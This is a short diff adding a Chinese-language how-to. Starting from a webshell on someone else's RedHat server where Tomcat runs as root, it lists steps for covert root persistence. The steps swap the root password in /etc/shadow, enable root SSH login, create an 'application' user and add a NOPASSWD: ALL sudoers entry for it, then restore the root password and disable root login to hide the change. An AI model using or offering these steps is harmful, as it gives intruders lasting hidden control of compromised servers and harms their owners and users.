@@ -1,0 +1,26 @@
+某日拿到某站webshell，redhat 系统，Tomcat程序是root身份启动的，webshell当然也拥有root权限。
+ 
+
+1.webshell直接替换root密码: /etc/shadow // 记得备份
+ 
+
+2.允许root通过ssh登陆: /etc/ssh/sshd_config
+PermitRootLogin yes #允许root登陆
+ 
+
+3.重启ssh服务 service ssh restart
+ 
+
+4.以root身份登陆ssh，增加一个用户
+useradd application
+passwd // 根据提示设置密码
+ 
+
+5.更改application用户运行su不需密码
+chmod +w /etc/sudoers // 增加写入权限，默认只读
+修改/etc/sudoers
+vi /etc/sudoers
+加入application ALL=(ALL) NOPASSWD: ALL
+ 
+
+6.把root密码修改回原样，禁止root登陆。完工
